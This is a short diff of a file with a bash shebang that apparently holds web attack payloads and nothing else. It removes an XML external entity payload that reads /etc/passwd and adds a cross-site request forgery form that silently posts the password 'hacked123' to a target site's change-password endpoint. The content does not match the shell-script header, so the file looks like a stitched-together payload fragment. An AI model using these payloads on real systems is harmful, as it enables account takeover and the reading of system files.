@@ -1,7 +1,9 @@
 #!/bin/bash
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<foo>&xxe;</foo>
+<form action="http://target.com/change-password" method="POST">
+  <input type="hidden" name="password" value="hacked123">
+  <input type="submit">
+</form>
+
 
 
